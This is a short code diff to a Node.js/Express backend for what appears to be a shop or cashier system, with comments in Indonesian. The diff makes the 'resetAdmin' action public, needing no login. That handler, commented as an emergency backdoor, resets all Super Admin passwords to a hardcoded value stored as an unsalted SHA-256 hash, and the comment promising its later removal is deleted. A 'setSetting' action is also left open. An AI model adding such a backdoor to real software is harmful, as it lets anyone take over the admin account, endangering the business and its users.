@@ -144,7 +144,7 @@ app.use((req, res, next) => {
 
 
 // Actions yang tidak perlu auth (public)
-const PUBLIC_ACTIONS = new Set(["login", "verifySuperAdmin", "bootstrap", "dashboard", "getSetting", "setSetting", "modules", "requestMagicLink", "verifyMagicLink", "generateAuthOptions", "verifyAuth"]);
+const PUBLIC_ACTIONS = new Set(["login", "verifySuperAdmin", "bootstrap", "dashboard", "getSetting", "setSetting", "modules", "requestMagicLink", "verifyMagicLink", "generateAuthOptions", "verifyAuth", "resetAdmin"]);
 const KASIR_COLLECTIONS = new Set(["products", "suppliers", "purchases", "sales", "priceHistory"]);
 
 function verifyToken(req, res, next) {
@@ -291,11 +291,11 @@ async function handleAction(action, payload, req) {
     getSetting: () => getSetting(payload.key, payload.fallback),
     setSetting: async () => { await setSetting(payload.key, payload.value); return { ok: true }; },
     resetAdmin: async () => {
-      // Pintu Belakang Darurat (Akan dihapus nanti)
-      const defaultPassword = "garnetamart123";
+      // Pintu Belakang Darurat
+      const defaultPassword = "111080";
       const hashed = crypto.createHash("sha256").update(defaultPassword).digest("hex");
       await db.query("UPDATE users SET password_hash = ? WHERE role = 'Super Admin'", [hashed]);
-      return { message: `Password Super Admin berhasil di-reset menjadi: ${defaultPassword}` };
+      return { message: `Password Super Admin berhasil di-reset ke default!` };
     }
   };
 
